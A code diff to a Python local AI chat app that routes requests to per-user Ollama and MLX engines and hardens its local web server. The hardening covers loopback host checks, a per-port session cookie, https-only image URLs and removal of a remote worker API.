@@ -7032,7 +6871,7 @@ def _pull_ollama_model(label: str, tag: str):
     """`ollama pull` via the API, streaming progress into the job dict."""
     payload = json.dumps({"model": tag, "stream": True}).encode("utf-8")
     req = urllib.request.Request(
-        "http://127.0.0.1:11434/api/pull", data=payload,
+        ollama_url("/api/pull"), data=payload,
         headers={"Content-Type": "application/json"},
     )
     with urllib.request.urlopen(req) as r:
@@ -7359,7 +7198,7 @@ def _remove_models(want: list) -> tuple:
             else:
                 try:
                     _rq = urllib.request.Request(
-                        "http://127.0.0.1:11434/api/delete",
+                        ollama_url("/api/delete"),
                         data=json.dumps({"name": target}).encode(),
                         headers={"Content-Type":
                                  "application/json"},
@@ -7369,9 +7208,13 @@ def _remove_models(want: list) -> tuple:
                     _ob = _ollama_bin()
                     if not _ob:
                         raise RuntimeError("Ollama engine offline")
-                    _rr = subprocess.run([_ob, "rm", target],
-                                         capture_output=True,
-                                         timeout=30)
+                    # the CLI defaults to 11434 too: point it at
+                    # this user's Ollama (6b310)
+                    _rr = subprocess.run(
+                        [_ob, "rm", target], capture_output=True,
+                        timeout=30, env=dict(
+                            os.environ, OLLAMA_HOST=urllib.parse.urlsplit(
+                                ollama_url("")).netloc))
                     if _rr.returncode != 0:
                         # a silent non-zero here reported
                         # "removed" while the weights stayed
@@ -7744,8 +7587,11 @@ def _other_millenai_running() -> bool:
     shutdown must never terminate one a sibling is still using. (Checking
     only 8889/9889 missed a :9899 instance and knifed the desktop's
     engine — seen live, twice.)"""
+    # THIS USER'S siblings only (6b310): another login's app shares no
+    # engine with us any more, and counting it left ours running forever
     try:
-        out = subprocess.run(["pgrep", "-f", "millenai.py"],
+        out = subprocess.run(["pgrep", "-U", str(os.getuid()), "-f",
+                              "millenai.py"],
                              capture_output=True, text=True, timeout=4).stdout
         pids = {int(x) for x in out.split() if x.isdigit()}
         pids.discard(os.getpid())
@@ -7755,9 +7601,21 @@ def _other_millenai_running() -> bool:
     except Exception:
         pass
     for p in (8889, 9889):
-        if p != PORT and _port_in_use(p):
+        if p != PORT and _port_in_use(p) and _listener_is_mine(p) is True:
             return True
     return False
+
+
+def _proc_port(p) -> str:
+    """The port a managed process was started on, as text: the MLX
+    engine's --port argument, or a private Ollama's OLLAMA_HOST."""
+    try:
+        args = list(p.args) if isinstance(p.args, (list, tuple)) else []
+        if "--port" in args:
+            return str(args[args.index("--port") + 1])
+    except Exception:
+        pass
+    return str(getattr(p, "_cai_port", ""))
 
 
 def stop_managed_engines():
@@ -7770,6 +7628,15 @@ def stop_managed_engines():
     # them (seen live: a live-service restart broke the desktop's next
     # query). The boot reaper and idle janitor clean up either way.
     if _other_millenai_running():
+        # engines on ports we MOVED to (another account held the usual
+        # one) and a private Ollama serve nobody else knows about: a
+        # sibling can't be using those, so they always go (6b310)
+        for p in list(_managed_procs) + list(_mlx_procs.values()):
+            try:
+                if _proc_port(p) in {str(x) for x in _RELOCATED}:
+                    p.terminate()
+            except Exception:
+                pass
         _mlx_procs.clear()
         return
     for p in list(_managed_procs) + list(_mlx_procs.values()):
@@ -7950,9 +7817,11 @@ def _page_text(url: str, cap: int = 2600, meta: list = None) -> str:
                 return ""
             raw = r.read(400_000).decode("utf-8", "replace")
         if meta is not None:
+            # https only (6b310): an http:// photo on 127.0.0.1 would
+            # carry the app's launch key to whoever listens there
             m = re.search(r'property=["\']og:image["\'][^>]*?content=["\']'
-                          r'(https?://[^"\']+)', raw) or \
-                re.search(r'content=["\'](https?://[^"\']+)["\'][^>]*?'
+                          r'(https://[^"\']+)', raw) or \
+                re.search(r'content=["\'](https://[^"\']+)["\'][^>]*?'
                           r'property=["\']og:image', raw)
             if m:
                 meta.append(m.group(1)[:400])
@@ -7981,7 +7850,7 @@ def _page_text(url: str, cap: int = 2600, meta: list = None) -> str:
                 if len(meta) >= 6:
                     break
                 _u = urllib.parse.urljoin(url, _m.group(1))
-                if (_u.startswith("http") and not _skip.search(_u)
+                if (_u.startswith("https://") and not _skip.search(_u)
                         and _u not in meta):
                     meta.append(_u[:400])
         raw = re.sub(r"(?is)<(script|style|nav|header|footer|aside)[^>]*>"
@@ -8801,7 +8670,7 @@ def stream_ollama(tag: str, messages: list, emit) -> None:
         "options": {"temperature": 0.75},
     }).encode("utf-8")
     req = urllib.request.Request(
-        "http://127.0.0.1:11434/api/chat",
+        ollama_url("/api/chat"),
         data=payload,
         headers={"Content-Type": "application/json"},
     )
@@ -8951,6 +8820,29 @@ def fold_system(messages: list) -> list:
     return out
 
 
+def _need_engine(label: str, timeout: float = 180.0):
+    """ensure_mlx_engine, or stop (6b310): its False used to be ignored,
+    and the prompt went to whatever held the port."""
+    if not ensure_mlx_engine(label, timeout=timeout):
+        raise RuntimeError("%s's engine didn't start for this account; "
+                           "nothing was sent" % label)
+
+
+def _retire_engine(label: str):
+    """Drop an engine handle AND the process behind it. Popping the
+    handle alone left a live copy of the weights nobody tracked."""
+    proc = _mlx_procs.pop(label, None)
+    if proc is not None and proc.poll() is None:
+        try:
+            proc.terminate()
+            proc.wait(timeout=8)
+        except Exception:
+            try:
+                proc.kill()
+            except Exception:
+                pass
+
+
 def run_model(label: str, messages: list, emit, thinking: bool = False) -> None:
     """Stream one model's answer, handling engine startup and templates."""
     # NO 70B fallback: an unknown label used to route to llama3.3:70b on
@@ -8969,7 +8861,7 @@ def run_model(label: str, messages: list, emit, thinking: bool = False) -> None:
         global _mlx_last_use
         _mlx_last_use = time.time()
         with _engine_lock:
-            ensure_mlx_engine(label)
+            _need_engine(label)
     msgs, attempts, folded = messages, 0, False
     while True:
         try:
@@ -8982,13 +8874,22 @@ def run_model(label: str, messages: list, emit, thinking: bool = False) -> None:
             if kind == "ollama":
                 stream_ollama(target, msgs, _tap)
             else:
+                # re-read (ensure may have moved the engine off a port
+                # another account holds) and check the listener afresh,
+                # right before the prompt goes out (6b310)
+                target = MODEL_ROUTES[label][1]
+                _MINE_CACHE["ports"] = None
+                if _listener_is_mine(target) is not True:
+                    raise RuntimeError(
+                        "%s's engine isn't running for this account; "
+                        "nothing was sent" % label)
                 stream_openai_compat(target, label, msgs, _tap, thinking)
             if not "".join(got).strip() and attempts < 1 and kind == "mlx":
                 # a silent engine is a dead engine — respawn once
                 attempts += 1
                 with _engine_lock:
-                    _mlx_procs.pop(label, None)
-                    ensure_mlx_engine(label)
+                    _retire_engine(label)
+                    _need_engine(label)
                 time.sleep(1.5)
                 continue
             return
@@ -9015,7 +8916,7 @@ def run_model(label: str, messages: list, emit, thinking: bool = False) -> None:
                 raise
             if kind == "mlx":
                 with _engine_lock:
-                    _mlx_procs.pop(label, None)
+                    _retire_engine(label)
                     # A RETRY GETS A SHORT WINDOW (6b239). This called
                     # ensure_mlx_engine with its full 180s default, and
                     # with two retries allowed a bring-up that was never
@@ -9023,7 +8924,7 @@ def run_model(label: str, messages: list, emit, thinking: bool = False) -> None:
                     # first attempt already had the long window; if the
                     # engine didn't come up then, more waiting is not
                     # the missing ingredient.
-                    ensure_mlx_engine(label, timeout=45.0)
+                    _need_engine(label, timeout=45.0)
             time.sleep(1.5 * attempts)
 
 
@@ -9167,7 +9068,7 @@ def _stream_guarded(label: str, msgs: list, emit, status,
                 raise _Degenerate
             return True
         except _Degenerate:
-            emit(f"{NUL}RESET{NUL}")  # tells the UI to discard the garbage
+            emit(Ctl(f"{NUL}RESET{NUL}"))  # tells the UI to discard the garbage
             if attempt == 1:
                 # collapse is often sampling luck — but MLX engines seed
                 # deterministically, so an IDENTICAL retry can replay the
@@ -9292,7 +9193,7 @@ def run_cloud_only(messages: list, emit, status, step) -> None:
         status("%s · cloud" % lbl)
         step("draft", "Drafting the answer", "run", lbl)
         try:
-            emit(NUL + "RUN:" + json.dumps({"r": [lbl]}) + NUL)
+            emit(Ctl(NUL + "RUN:" + json.dumps({"r": [lbl]}) + NUL))
         except Exception:
             pass
         if cloud_stream_conf(c, messages, emit):
@@ -9415,7 +9316,7 @@ def run_council(labels: list, messages: list, emit, status,
         'Compositor: name' once the merge starts."""
         try:
             if compositor is not None:
-                emit(NUL + "RUN:" + json.dumps({"c": compositor}) + NUL)
+                emit(Ctl(NUL + "RUN:" + json.dumps({"c": compositor}) + NUL))
                 return
             with _run_lock:
                 if add:
@@ -9423,7 +9324,7 @@ def run_council(labels: list, messages: list, emit, status,
                 if rm:
                     _running.discard(rm)
                 now = sorted(_running)
-            emit(NUL + "RUN:" + json.dumps({"r": now}) + NUL)
+            emit(Ctl(NUL + "RUN:" + json.dumps({"r": now}) + NUL))
         except Exception:
             pass
 
@@ -9432,8 +9333,8 @@ def run_council(labels: list, messages: list, emit, status,
         modes, and until now its only visible trace was a status line."""
         drafts.append((label, text))
         try:
-            emit(NUL + "DRAFT:" +
-                 json.dumps({"m": label, "t": text[:1200]}) + NUL)
+            emit(Ctl(NUL + "DRAFT:" +
+                     json.dumps({"m": label, "t": text[:1200]}) + NUL))
         except Exception:
             pass          # never let the display break the answer
 
@@ -9628,8 +9529,8 @@ def run_council(labels: list, messages: list, emit, status,
             if text and not _looks_degenerate(text) and len(text) > 200:
                 reviews.append((label, text))
                 try:
-                    emit(NUL + "DRAFT:" + json.dumps(
-                        {"m": label + " (rewrite)", "t": text[:1200]}) + NUL)
+                    emit(Ctl(NUL + "DRAFT:" + json.dumps(
+                        {"m": label + " (rewrite)", "t": text[:1200]}) + NUL))
                 except Exception:
                     pass
         if len(reviews) >= 2:
@@ -9750,7 +9651,7 @@ def run_council(labels: list, messages: list, emit, status,
             return True
         if got:       # something was shown — wipe it before the next try
             try:
-                emit(NUL + "RESET" + NUL)
+                emit(Ctl(NUL + "RESET" + NUL))
             except Exception:
                 pass
         return False
@@ -9805,7 +9706,7 @@ def run_council(labels: list, messages: list, emit, status,
                         "showing the best single answer")
     except Exception:
         try:
-            emit(NUL + "RESET" + NUL)
+            emit(Ctl(NUL + "RESET" + NUL))
             emit(good[0][1])
         except Exception:
             pass
@@ -10835,7 +10736,8 @@ def offline_hint(kind: str, err: Exception) -> str:
                    else "No details were provided."))
     if isinstance(err, urllib.error.URLError):
         if kind == "ollama":
-            return ("⚠️ Ollama isn't reachable on port 11434.\n\n"
+            return ("⚠️ Ollama isn't reachable on port %d.\n\n"
+                    % OLLAMA_PORT[0] +
                     "Start it with `ollama serve`, and make sure the model is "
                     "pulled (`ollama pull <model>`).")
         return ("⚠️ No MLX server answering on that port.\n\n"
@@ -11465,7 +11367,7 @@ def _funnel_image(query: str) -> str:
         meta = []          # _page_text appends og:image URLs as strings
         _fetch_pages([u for u in urls if u][:3], cap=200, meta=meta)
         for img in meta:
-            if isinstance(img, str) and img.startswith("http"):
+            if isinstance(img, str) and img.startswith("https://"):
                 return img
     except Exception:
         pass
@@ -11744,59 +11646,6 @@ function go(){
 </script></body></html>"""
 
 
-# The DOOR: what the bare public URL shows a browser with no cookie. Kept
-# self-contained (inline styles, system fonts, no assets) so it renders
-# instantly from anywhere — its whole job is one input box.
-GATE_PAGE = """<!doctype html><html><head><meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<meta name="robots" content="noindex">
-<title>MillenAI</title>
-<link href="https://fonts.googleapis.com/css2?family=Michroma&display=swap"
-      rel="stylesheet">
-<style>
-html,body{height:100%;margin:0}
-body{background:#0f1117;color:#ececec;display:flex;align-items:center;
-  justify-content:center;font-family:'Helvetica Neue',system-ui,sans-serif}
-.door{text-align:center;padding:24px}
-/* 6b243: same face as everywhere else — this page didn't even load it */
-h1{font-family:'Michroma','Space Grotesk',sans-serif;
-  font-size:clamp(28px,5.6vw,50px);letter-spacing:.06em;margin:0 0 6px;
-  font-weight:400;
-  background:linear-gradient(90deg,#f5f6f8,#c8ccd5,#9aa0ac,#e2e5ea,#8f95a1,#d5d8df,#f5f6f8,#ff8fd8);
-  -webkit-background-clip:text;background-clip:text;color:transparent;
-  filter:drop-shadow(0 0 22px rgba(140,150,255,.25))}
-/* 6b258, per Patrick: EXTRA extra bold AI, everywhere the wordmark
-   appears. These doors clip a gradient to the text, so the fill is
-   TRANSPARENT — a currentColor stroke would be invisible. The AI
-   takes a solid bright silver of its own plus the fattening stroke,
-   which also makes it read as its own word against the ramp. */
-h1 b{font-weight:400;-webkit-text-fill-color:#f5f6f8;
-  -webkit-text-stroke:.12em #f5f6f8;font-size:.865em;vertical-align:.06em}
-p{color:#8e8e8e;margin:0 0 26px;font-size:15px}
-.err{color:#e26d5a;min-height:20px;margin:12px 0 0;font-size:14px}
-form{display:flex;gap:10px;justify-content:center}
-input{background:#171717;border:1px solid #3d3d3d;border-radius:12px;
-  color:#ececec;font-size:16px;padding:13px 16px;width:min(320px,60vw);
-  outline:none;text-align:center;letter-spacing:.08em}
-input:focus{border-color:#8f9dff}
-button{background:#ececec;color:#111;border:0;border-radius:12px;
-  font-size:15px;font-weight:600;padding:13px 22px;cursor:pointer}
-button:hover{background:#fff}
-</style></head><body>
-<div class="door">
-  <h1>Concorde<b>AI</b></h1>
-  <p>private &middot; enter your access key</p>
-  <form onsubmit="location.href='/?key='+encodeURIComponent(
-      document.getElementById('k').value.trim());return false">
-    <input id="k" type="password" autocomplete="off" autofocus
-           placeholder="access key">
-    <button>Enter</button>
-  </form>
-  <div class="err">__GATE_NOTE__</div>
-</div>
-</body></html>"""
-
-
 class StudioHandler(http.server.BaseHTTPRequestHandler):
     protocol_version = "HTTP/1.0"  # lets us stream then close, no chunking
 
@@ -11806,52 +11655,53 @@ class StudioHandler(http.server.BaseHTTPRequestHandler):
     def _gate(self):
         """True = let the request through; False = already answered it.
 
-        The access-key door is RETIRED, per Patrick: the welcome screen
-        (account + PIN, Google SSO when configured) is the front door now.
-        Old /?key=... links simply land on the app; the admin lockdown and
-        per-identity storage below are what actually protect the host."""
-        return True
-        if not ACCESS_KEY:
-            return True
-        cookie = self.headers.get("Cookie", "") or ""
-        m = re.search(r"millen_key=([^;\s]+)", cookie)
-        # compare_digest: a plain == leaks how many leading characters
-        # matched through response timing — slow to exploit over a tunnel,
-        # free to prevent
-        if m and secrets.compare_digest(m.group(1), ACCESS_KEY):
-            return True
-        wrong = False
-        if self.path.startswith("/?key="):
-            if secrets.compare_digest(self.path[len("/?key="):],
-                                      ACCESS_KEY):
+        ONLY THIS APP'S OWN WINDOW GETS IN (6b310; the web version's door
+        page is gone with the web version). Two tests, on every request:
+          * addressed to this server's own loopback name and port. A
+            DNS-rebinding page arrives under its own hostname, so it
+            fails here before anything else is read.
+          * carrying this launch's ACCESS_KEY as a cookie. The window
+            collects it once through /?key=; another account's process
+            on this computer, or a page on a stray port, never has it.
+        The cookie is named for the port because browsers share cookies
+        across the ports of one host: a dev instance's key must not
+        overwrite the app's."""
+        host = (self.headers.get("Host") or "").strip().lower()
+        if host not in ("127.0.0.1:%d" % PORT, "localhost:%d" % PORT):
+            return self._deny()
+        # EVERY cookie of that name: a stray one with a longer Path sorts
+        # first and must not shadow the real key. compare_digest on
+        # BYTES: a str with a non-ASCII character raises TypeError.
+        for v in re.findall(r"(?:^|;)\s*millen_key_%d=([^;\s]+)" % PORT,
+                            self.headers.get("Cookie", "") or ""):
+            if secrets.compare_digest(v.encode("utf-8"),
+                                      ACCESS_KEY.encode("utf-8")):
+                return True
+        if self.command == "GET" and self.path.startswith("/?key="):
+            if secrets.compare_digest(
+                    urllib.parse.unquote(self.path[len("/?key="):])
+                    .encode("utf-8"), ACCESS_KEY.encode("utf-8")):
                 self.send_response(302)
-                self.send_header("Set-Cookie",
-                                 "millen_key=%s; Path=/; Max-Age=2592000; "
-                                 "SameSite=Lax" % ACCESS_KEY)
+                self.send_header(
+                    "Set-Cookie", "millen_key_%d=%s; Path=/; HttpOnly; "
+                    "SameSite=Strict" % (PORT, ACCESS_KEY))
                 self.send_header("Location", "/")
+                self.send_header("Content-Length", "0")
                 self.end_headers()
                 return False
-            wrong = True
-        if self.path == "/" or self.path.startswith("/?"):
-            body = brand(GATE_PAGE.replace(
-                "__GATE_NOTE__",
-                "that key isn’t right — try again" if wrong else "")
-                ).encode("utf-8")
-            self.send_response(200)
-            self.send_header("Content-Type", "text/html; charset=utf-8")
+        return self._deny()
+
+    def _deny(self) -> bool:
+        if self.command == "POST":
+            return self._refuse(403, "open the app from its own window")
+        body = brand("MillenAI: open the app from its own window."
+                     ).encode("utf-8")
+        try:
+            self.send_response(403)
+            self.send_header("Content-Type", "text/plain; charset=utf-8")
             self.send_header("Content-Length", str(len(body)))
             self.end_headers()
-            try:
-                self.wfile.write(body)
-            except Exception:
-                pass
-            return False
-        self.send_response(403)
-        self.send_header("Content-Type", "text/plain; charset=utf-8")
-        self.end_headers()
-        try:
-            self.wfile.write(brand("MillenAI: access key required.")
-                             .encode("utf-8"))
+            self.wfile.write(body)
         except Exception:
             pass
         return False
@@ -11891,8 +11741,8 @@ class StudioHandler(http.server.BaseHTTPRequestHandler):
             are the one way a cross-site form reaches a JSON endpoint
             without a preflight.
 
-        Native callers — curl, urllib, the fleet workers, the gauntlet
-        — send no Origin and a JSON content type, so they sail through.
+        Native callers — curl, urllib, the gauntlet — send no Origin
+        and a JSON content type, so they sail through.
         Local requests must also arrive addressed to localhost, which
         is what closes DNS rebinding."""
         ct = (self.headers.get("Content-Type") or "").split(";")[0]
@@ -12086,6 +11936,7 @@ class StudioHandler(http.server.BaseHTTPRequestHandler):
             self.send_header("Content-Length", str(len(body)))
             self.send_header("ETag", etag)
             self.send_header("Cache-Control", "no-cache")
+            self.send_header("Content-Security-Policy", PAGE_CSP)
             self.end_headers()
             self.wfile.write(body)
         elif self.path == "/auth/google":
@@ -12234,36 +12085,6 @@ class StudioHandler(http.server.BaseHTTPRequestHandler):
                 pass
         elif self.path.startswith("/sky/"):
             self._send_sky()
-        elif self.path == "/api/fleet/mine":
-            if self._remote():
-                self._send_json({"err": "owner only"})
-                return
-            led = {}
-            try:
-                with open(CONTRIB_LEDGER_FILE, encoding="utf-8") as f:
-                    led = json.load(f)
-            except Exception:
-                pass
-            self._send_json({"on": bool(load_prefs(None).get("contrib_on")),
-                             "state": _contrib_state[0],
-                             "ledger": {
-                                 "jobs": int(led.get("jobs") or 0),
-                                 "seconds": int(led.get("seconds") or 0),
-                                 "chars": int(led.get("chars") or 0)}})
-        elif self.path == "/api/fleet/status":
-            if self._remote():
-                self._send_json({"err": "owner only"})
-                return
-            alive = _fleet_alive()
-            with _fleet_lock:
-                pend = [{"id": w, "name": v["name"]}
-                        for w, v in _fleet_pending.items()]
-            self._send_json({"key": fleet_key(),
-                             "pending": pend,
-                             "workers": [{"name": v["name"],
-                                          "busy": v.get("busy", False),
-                                          "models": len(v.get("models", []))}
-                                         for v in alive.values()]})
         elif self.path.startswith("/api/remote/classify"):
             # read-only introspection of the safety classifier (6b249):
             # the UI uses it to preview a command's risk, and the gauntlet
@@ -12590,7 +12411,7 @@ class StudioHandler(http.server.BaseHTTPRequestHandler):
         pulled = None
         try:
             with urllib.request.urlopen(
-                "http://127.0.0.1:11434/api/tags", timeout=1.5
+                ollama_url("/api/tags"), timeout=1.5
             ) as r:
                 tags = json.loads(r.read().decode("utf-8")).get("models", [])
                 pulled = {m.get("name", "").split(":")[0] for m in tags} | \
@@ -12611,7 +12432,7 @@ class StudioHandler(http.server.BaseHTTPRequestHandler):
                                      "cmd": f"ollama pull {target}"}
             else:
                 repo = MLX_REPOS.get(label, "<model-repo>")
-                if _port_in_use(target):
+                if _engine_up(target):
                     status[label] = {"up": True, "note": f"loaded · port {target}"}
                 elif mlx_model_cached(repo):
                     # downloaded but idle — starts on demand, so it IS usable
@@ -12679,9 +12500,6 @@ class StudioHandler(http.server.BaseHTTPRequestHandler):
                 "mem_pressure": mem_pressure(),
                 "gpu_pct": gpu,  # None when ioreg has no accelerator stats
                 "users_online": online, "users_total": total,
-                "fleet_online": len(_fleet_alive()),
-                "fleet_busy": sum(1 for v in _fleet_alive().values()
-                                  if v.get("busy")),
             }
         else:
             stats = {"real": False, "gpu_pct": gpu,
@@ -12702,6 +12520,29 @@ class StudioHandler(http.server.BaseHTTPRequestHandler):
             self._refuse(403, "cross-site")
             return
         if not self._admin_gate():
+            return
+        if self.path == "/api/window/focus":
+            # a second launch asks this copy to come forward (6b310);
+            # browser mode reopens the tab WITH the key, so a browser
+            # that dropped its session cookie gets back in
+            try:
+                self.rfile.read(int(self.headers.get("Content-Length", 0)
+                                    or 0))
+                if HAS_WEBVIEW and webview.windows:
+                    _w = webview.windows[0]
+                    _w.restore()
+                    _w.show()
+                    if IS_MAC:
+                        from AppKit import NSApp
+                        from PyObjCTools import AppHelper
+                        AppHelper.callAfter(
+                            lambda: NSApp.activateIgnoringOtherApps_(True))
+                elif os.environ.get("MILLENAI_HEADLESS") != "1":
+                    webbrowser.open("http://127.0.0.1:%d/?key=%s" % (
+                        PORT, urllib.parse.quote(ACCESS_KEY)))
+            except Exception:
+                pass
+            self._send_json({"ok": True})
             return
         if self.path == "/api/welcome":
             n = int(self.headers.get("Content-Length", 0))
@@ -13051,112 +12892,6 @@ class StudioHandler(http.server.BaseHTTPRequestHandler):
                 return
             self.send_error(404)
             return
-        if self.path.startswith("/api/fleet/"):
-            n = int(self.headers.get("Content-Length", 0) or 0)
-            try:
-                d = json.loads(self.rfile.read(n)) if n else {}
-            except (ValueError, json.JSONDecodeError):
-                d = {}
-            if self.path == "/api/fleet/approve":
-                # the OWNER approving a knock — no fleet key involved
-                if self._remote():
-                    self._send_json({"err": "owner only"})
-                    return
-                wid0 = str(d.get("id", ""))
-                with _fleet_lock:
-                    pend = _fleet_pending.pop(wid0, None)
-                if pend:
-                    appr = _fleet_approved()
-                    appr[wid0] = {"name": pend["name"],
-                                  "token": secrets.token_urlsafe(18)}
-                    _fleet_save_approved(appr)
-                self._send_json({"ok": bool(pend)})
-                return
-            key = self.headers.get("X-Fleet-Key", "")
-            keyed = secrets.compare_digest(key, fleet_key())
-            wid = str(d.get("id") or "")
-            approved = _fleet_approved()
-            token_ok = (wid in approved and secrets.compare_digest(
-                str(d.get("token", "")), approved[wid].get("token", "?")))
-            if self.path == "/api/fleet/register":
-                # ONE-CLICK flow: no key typed anywhere. A new worker
-                # lands in the pending list until the owner approves it
-                # in Settings; then a token rides every request.
-                name = str(d.get("name", "worker"))[:40]
-                models = [m for m in (d.get("models") or [])
-                          if isinstance(m, str)][:40]
-                if not wid:
-                    wid = secrets.token_hex(8)
-                claim = approved.get(wid)
-                # AUTOMATED, per Patrick: a fresh worker is approved on
-                # arrival and gets its token in the same breath — the
-                # fleet is one toggle end to end. fleet_auto=False in
-                # prefs restores the old knock-and-approve flow.
-                if (not claim and not token_ok
-                        and load_prefs(None).get("fleet_auto", True)):
-                    claim = {"token": secrets.token_hex(16),
-                             "claimed": False, "name": name}
-                    approved[wid] = claim
-                    _fleet_save_approved(approved)
-                if keyed or token_ok or (claim and not claim.get("claimed")):
-                    if claim and not claim.get("claimed"):
-                        # ONE-TIME token handover right after approval —
-                        # a lost token means the owner approves again
-                        claim["claimed"] = True
-                        approved[wid] = claim
-                        _fleet_save_approved(approved)
-                    with _fleet_lock:
-                        _fleet_workers[wid] = {
-                            "name": name, "models": models,
-                            "last_seen": time.time(),
-                            "busy": _fleet_workers.get(wid, {}).get(
-                                "busy", False)}
-                        _fleet_pending.pop(wid, None)
-                    tok = approved.get(wid, {}).get("token", "")
-                    self._send_json({"id": wid, "token": tok})
-                    return
-                with _fleet_lock:
-                    _fleet_pending[wid] = {"name": name, "models": models,
-                                           "ts": time.time()}
-                    # forgotten knocks expire
-                    for w in [w for w, v in _fleet_pending.items()
-                              if time.time() - v["ts"] > 900]:
-                        _fleet_pending.pop(w, None)
-                self._send_json({"id": wid, "pending": True})
-                return
-            if not (keyed or token_ok):
-                self._send_json({"err": "not approved"})
-                return
-            if self.path == "/api/fleet/poll":
-                wid = str(d.get("id", ""))
-                deadline = time.time() + 25
-                while time.time() < deadline:
-                    with _fleet_lock:
-                        if wid in _fleet_workers:
-                            _fleet_workers[wid]["last_seen"] = time.time()
-                        for jid in list(_fleet_queue):
-                            job = _fleet_jobs.get(jid)
-                            if job and job["wid"] == wid:
-                                _fleet_queue.remove(jid)
-                                self._send_json(
-                                    {"job": jid, "label": job["label"],
-                                     "messages": job["messages"]})
-                                return
-                    time.sleep(0.4)
-                self._send_json({})
-                return
-            if self.path == "/api/fleet/submit":
-                jid = str(d.get("job", ""))
-                with _fleet_lock:
-                    job = _fleet_jobs.get(jid)
-                    if job:
-                        job["text"] = str(d.get("text", ""))[:60000]
-                        job["err"] = str(d.get("err", ""))[:200]
-                        job["done"].set()
-                self._send_json({"ok": True})
-                return
-            self.send_error(404)
-            return
         if self.path == "/api/setup/install":
             # warm one backdrop alongside the models, so the very first
             # launch already opens onto a moving city
@@ -13397,9 +13132,6 @@ class StudioHandler(http.server.BaseHTTPRequestHandler):
                     _no_limits["v"] = bool(d.get("no_limits"))
                 if base is None and "include_giants" in d:
                     _giants["v"] = bool(d.get("include_giants"))
-                if base is None and any(k.startswith("contrib_") for k in d):
-                    threading.Thread(target=contrib_apply, args=(cur,),
-                                     daemon=True).start()
             self._send_json({"ok": isinstance(d, dict)})
             return
         if self.path == "/api/chats":
@@ -13499,8 +13231,8 @@ class StudioHandler(http.server.BaseHTTPRequestHandler):
             if "prefs" in scopes:
                 if base is None:
                     # personal keys only — machine config (turbo,
-                    # contribute, update channel) is not "about the
-                    # user" and must survive
+                    # update channel) is not "about the user" and must
+                    # survive
                     p = load_prefs(None)
                     for k in ("persona", "length", "user_name"):
                         p.pop(k, None)
@@ -14644,7 +14376,9 @@ class StudioHandler(http.server.BaseHTTPRequestHandler):
         answer_buf = []
 
         def emit(chunk: str):
-            chunk = strip_special(chunk)
+            if not isinstance(chunk, Ctl):
+                # model text can't open a frame (see Ctl)
+                chunk = strip_special(chunk).replace(NUL, "")
             if not chunk:
                 return
             sent[0] += len(chunk)
@@ -14664,6 +14398,7 @@ class StudioHandler(http.server.BaseHTTPRequestHandler):
         def status(text: str):
             # sentinel-wrapped so the UI can show progress without it
             # ending up inside the answer text
+            text = str(text).replace(NUL, "")
             last_status[0] = text
             _write(f"{NUL}STATUS:{text}{NUL}".encode("utf-8"))
 
@@ -14757,9 +14492,17 @@ class StudioHandler(http.server.BaseHTTPRequestHandler):
             return
 
         if img_subject:
-            where = "on this Mac" if image_ready() else "in the cloud"
-            step("image", "Generating the image", "run", where)
-            status("painting \u00b7 " + where)
+            # "in the cloud" only when a cloud painter exists (6b310): with
+            # Pollinations gone, no local model and no Gemini key means
+            # nothing is sent anywhere, and the label mustn't say it was
+            _gem = (_cloud_all().get("providers") or {}).get("gemini") or {}
+            _cloud_img = (not _guest and bool(_gem.get("key"))
+                          and _gem.get("status", "ok") == "ok")
+            where = ("on this Mac" if image_ready() else
+                     "in the cloud" if _cloud_img else "")
+            if where:
+                step("image", "Generating the image", "run", where)
+                status("painting \u00b7 " + where)
             try:
                 _use, _cnotes = resolve_overrides("image", _ovr, _pnote)
                 path, src = generate_image(img_subject, _use,
@@ -14787,9 +14530,10 @@ class StudioHandler(http.server.BaseHTTPRequestHandler):
                     emit("The picture service couldn\u2019t paint this one "
                          "just now \u2014 try again in a moment.")
                 elif image_ready():
-                    emit("The painter on this Mac hit a snag and the cloud "
-                         "couldn\u2019t step in \u2014 try once more in a moment. "
-                         "(%s)" % str(exc)[:160])
+                    emit("The painter on this Mac hit a snag%s \u2014 try "
+                         "once more in a moment. (%s)"
+                         % (" and the cloud couldn\u2019t step in"
+                            if _cloud_img else "", str(exc)[:160]))
                 elif image_supported():
                     emit("I can\u2019t make pictures on this Mac yet. Add "
                          "image generation under **Settings \u203a Models \u203a "
@@ -14827,7 +14571,7 @@ class StudioHandler(http.server.BaseHTTPRequestHandler):
             # and a pinned map when the answer is about a real place
             ph = [p for p in dict.fromkeys(
                 getattr(_tl_search, "photos", []) or [])
-                if p.startswith("http")][:3]
+                if p.startswith("https://")][:3]
             if ph:
                 try:
                     _write((NUL + "PHOTOS:" + json.dumps(ph) + NUL)
@@ -15007,8 +14751,8 @@ class StudioHandler(http.server.BaseHTTPRequestHandler):
 
                 def _run_lbl(names):
                     try:
-                        emit(NUL + "RUN:"
-                             + json.dumps({"r": names}) + NUL)
+                        emit(Ctl(NUL + "RUN:"
+                                 + json.dumps({"r": names}) + NUL))
                     except Exception:
                         pass
                 if turbo:
@@ -15034,23 +14778,7 @@ class StudioHandler(http.server.BaseHTTPRequestHandler):
                             hb_stop.set()
                             return
                     status("cloud power unavailable — running locally")
-                # NO KEY, STILL BOOSTED: the keyless community cloud gets
-                # the same shot before local silicon does, whenever the
-                # user asked for cloud power without a key of their own.
-                # An ADVANCED run that named its clouds (or named none)
-                # said exactly what it wants — the community GPU is not
-                # on that list (6b248, caught live: cloud:[] still tried
-                # the free cloud).
-                elif (load_prefs(None).get("turbo") and not images
-                        and req_cloud is None):
-                    if time.time() >= _free_cold[0]:
-                        status("trying the free community cloud")
-                        if free_cloud_stream(full_messages, emit):
-                            hb_stop.set()
-                            return
                 _run_lbl([lbl])
-                ftext = fleet_run(lbl, full_messages, status) \
-                    if not images else ""
                 # searched answers were EXCLUDED from the polish pass, so
                 # every live-data reply was a single take — that's where
                 # the sloppy ones came from. Bookish (recommendations)
@@ -15059,9 +14787,7 @@ class StudioHandler(http.server.BaseHTTPRequestHandler):
                 polish = (load_prefs(None).get("polish", True)
                           and not images and (not query or bookish)
                           and _is_substantive(prompt))
-                if ftext:
-                    emit(ftext)
-                elif polish:
+                if polish:
                     step("draft", "Drafting the answer", "run", lbl)
                     # TWO PASS: draft in silence, then stream the rewrite.
                     # The reader waits a little longer and gets a visibly
@@ -15283,15 +15009,154 @@ class StudioHandler(http.server.BaseHTTPRequestHandler):
                     daemon=True).start()
 
 
-def start_backend():
